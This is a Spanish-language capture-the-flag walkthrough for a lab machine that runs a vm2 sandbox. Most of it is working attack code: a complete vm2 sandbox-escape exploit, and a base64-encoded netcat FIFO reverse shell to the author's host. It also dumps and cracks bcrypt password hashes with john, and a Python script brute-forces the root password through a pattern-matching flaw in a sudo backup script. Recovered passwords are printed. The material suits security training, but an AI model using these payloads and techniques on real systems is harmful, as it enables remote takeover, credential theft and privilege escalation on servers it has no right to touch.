Hacemos un escaneo con [[Anotaciones/Herramientas/Nmap|Nmap]] de los puertos y las versiones de los servicios que estan corriendo
![[Pasted image 20240120001307.png]]
Vemos que hay un puerto 22,80 abiertos, vamos a a ver que hay en el puerto 80
![[Pasted image 20240120001400.png]]
vemos que hay un apartado de about, y dentro nos pone la libreria que esta usando para hacer el sandbox `vb2` 
![[Pasted image 20240120001519.png]]
apesar de no saber la version vamos a ver si tiene alguna vulnerabilidad
https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244
en este caso vamos a hacer uso de este codigo
```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
}
`

console.log(vm.run(code));
```

en este codigo lo unico que tenemos que hacer es cambiar donde pone 'touch pwned' por el comando que queramos ejecutar
![[Pasted image 20240120001814.png]]
ahora solo debemos mandarnos una revershell, en caso de tener conflicto con los signos podemos pasarlo a base 64 y decodificarlo en el codigo de esta forma:
```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};

const base64String = 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxiYXNoIC1pIDI+JjF8bmMgMTAuMTAuMTYuOTEgNDQ0NCA+L3RtcC9m'
const decoded = Buffer.from(base64String, 'base64').toString('utf-8')


const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync(decoded);
}
`

console.log(vm.run(code));
```
en este caso estoy mandandome una revershell por medio de fifo ya que el resto por alguna razon no las puedo usar
![[Pasted image 20240120002014.png]]
despues del [[Tratamiento de la tty]] se tendria que ver asi, vemos que hay dos usuarios
![[Pasted image 20240120002103.png]]
svc es el que ya tenemos pero tenemos que ver alguna forma de escalar los privilegios, si miramos los archivos ocultos del usuario `svc` vemos que esta instalado `pm2` que es una herramienta para la gestion de procesos en app basadas en node.js
```bahs
pm2 ps
```
![[Pasted image 20240120010402.png]]
ahora vamos a ver mas informacion del proceso 0
```bash
pm2 desc 0
```
![[Pasted image 20240120011032.png]]
hemos encontrado el direcotrio de trabajo del servidior, si vemos desde `/var/www` vemos una carpeta contacts la cual tiene un archivo nombrado como tickets.db
![[Pasted image 20240120011123.png]]
ahora usando sqlite3 podemos ver el contenido de la base de datos
```bash
sqlite3 tickets.db
```
ahora podemos hacer peticiones, y para listar las tablas hacemos esto:
```sqlite
select * from sqlite_master where type = "table";
```
![[Pasted image 20240120011528.png]]
ahoa vamos a listar los usuario y passwords
```sqlite
select username,password from users
```
![[Pasted image 20240120011620.png]]
ahora solo debemos hacer fuerza bruta con jhon
![[Pasted image 20240120011714.png]]
```bash
john --format=bcrypt credentials --wordlist /usr/share/wordlists/rockyou.txt
```
```bash
john credentials --show
```
password: `spongebob1`

nos conectamos por ssh y ya estemos la session
![[Pasted image 20240120013737.png]]
![[Pasted image 20240120013755.png]]

ahora falta la de root, si hacemos `sudo -l` y vemos que tenemos acceso a este recurso como root
![[Pasted image 20240120014220.png]]
El archivo en cuestion es este
```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```
para ejecutarlo nos pide una contraseña, vamos a hacer fuerza bruta:
```python
import string
import os

def check_password(p):
	command = f"echo '{p}*' | sudo /opt/scripts/mysql-backup.sh"
	result = os.popen(command).read()
	return "Password confirmed!" in result

charset = string.ascii_letters + string.digits
password = ""
is_password_found = False

while not is_password_found:
	for char in charset:
		if check_password(password + char):
			password += char
			break
	else:
		is_password_found = True

		with open("root-pass.txt", "w") as file:
			file.write(password)
```
 (en el home del usuario vemos un script en py que hace lo mismo)
 ![[Pasted image 20240120014745.png]]
Password: kljh12k3jhaskjh12kjh3
ahora ya tenemos acceso a root
![[Pasted image 20240120015458 1.png]]